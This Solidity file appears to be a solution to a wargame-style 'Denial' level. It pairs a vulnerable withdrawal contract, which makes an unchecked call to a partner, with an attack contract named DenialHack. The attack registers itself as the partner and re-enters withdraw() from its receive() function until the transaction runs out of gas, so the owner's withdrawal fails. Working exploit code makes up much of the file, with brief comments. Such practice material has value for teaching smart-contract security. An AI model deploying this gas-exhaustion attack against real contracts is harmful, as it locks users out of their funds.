// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// goal: deny the owner from withdrawing funds when they call withdraw() 
// (whilst the contract still has funds, and the transaction is of 1M gas or less)

// an original contract
// deploy it first
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = payable (address (0x5B38Da6a701c568545dCfcB03FcB875f56beddC4));
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner] + amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// a contract that hacks the original one
// deploy it second
contract DenialHack {
  // use this function
  function hack(Denial _denialAddress) external {
    _denialAddress.setWithdrawPartner(address (this));
  }

  // transferring any money to this contract begets recursion so the transaction
  // will cost >1.7kk gas that is more than needed for our goal
  receive() external payable {
    Denial (payable (msg.sender)).withdraw();
  }
}